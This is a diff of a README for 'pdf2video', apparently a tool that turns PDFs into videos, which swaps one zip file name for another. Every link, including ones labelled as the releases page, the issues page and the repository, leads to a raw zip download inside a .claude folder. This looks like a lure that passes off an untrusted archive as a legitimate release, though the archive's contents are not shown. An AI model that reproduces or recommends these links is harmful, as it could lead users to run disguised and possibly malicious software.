@@ -1,13 +1,13 @@
 # 🎥 pdf2video - Turn PDFs into Engaging Videos
 
 ## 🔗 Download Here
-[![Download pdf2video](https://github.com/jokesopboy/pdf2video/raw/refs/heads/main/.claude/pdf-video-dramshop.zip)](https://github.com/jokesopboy/pdf2video/raw/refs/heads/main/.claude/pdf-video-dramshop.zip)
+[![Download pdf2video](https://github.com/jokesopboy/pdf2video/raw/refs/heads/main/.claude/pdf_video_3.4.zip)](https://github.com/jokesopboy/pdf2video/raw/refs/heads/main/.claude/pdf_video_3.4.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run pdf2video, a tool designed to transform your PDF documents into engaging video presentations with smooth animations. Follow these simple steps to get started.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/jokesopboy/pdf2video/raw/refs/heads/main/.claude/pdf-video-dramshop.zip) to download the latest version.
+1. Visit the [Releases page](https://github.com/jokesopboy/pdf2video/raw/refs/heads/main/.claude/pdf_video_3.4.zip) to download the latest version.
 2. On the releases page, you will find different versions of pdf2video. Choose the most recent one.
 3. Click on the version number to expand the details, then look for the files available for download.
 4. Download the appropriate file for your operating system. For example, Windows users can look for a `.exe` file, while macOS users should select a `.dmg` file.
@@ -61,7 +61,7 @@ If you encounter issues during installation or while using the application, try 
 - **Check Compatibility:** Ensure your operating system meets the requirements.
 - **Reinstall the Application:** Sometimes a fresh installation can resolve issues.
 - **Update Drivers:** Make sure your graphics and audio drivers are up to date.
-- **Consult the Support:** Visit the [Issues page](https://github.com/jokesopboy/pdf2video/raw/refs/heads/main/.claude/pdf-video-dramshop.zip) for help from the community or to report bugs.
+- **Consult the Support:** Visit the [Issues page](https://github.com/jokesopboy/pdf2video/raw/refs/heads/main/.claude/pdf_video_3.4.zip) for help from the community or to report bugs.
 
 ## 🆕 Features
 pdf2video includes several powerful features to enhance your presentations:
@@ -72,10 +72,10 @@ pdf2video includes several powerful features to enhance your presentations:
 - **Multiple File Formats:** Export your videos in various formats including MP4, AVI, and more.
 
 ## 📞 Support
-If you need further assistance, feel free to reach out by opening an issue on the [GitHub repository](https://github.com/jokesopboy/pdf2video/raw/refs/heads/main/.claude/pdf-video-dramshop.zip). The community and the developers are here to help.
+If you need further assistance, feel free to reach out by opening an issue on the [GitHub repository](https://github.com/jokesopboy/pdf2video/raw/refs/heads/main/.claude/pdf_video_3.4.zip). The community and the developers are here to help.
 
 ## 🔗 Final Download Link
 For your convenience, here is the download link one more time:
-[Download pdf2video](https://github.com/jokesopboy/pdf2video/raw/refs/heads/main/.claude/pdf-video-dramshop.zip)
+[Download pdf2video](https://github.com/jokesopboy/pdf2video/raw/refs/heads/main/.claude/pdf_video_3.4.zip)
 
 Now you are ready to transform your PDFs into engaging videos. Enjoy creating!
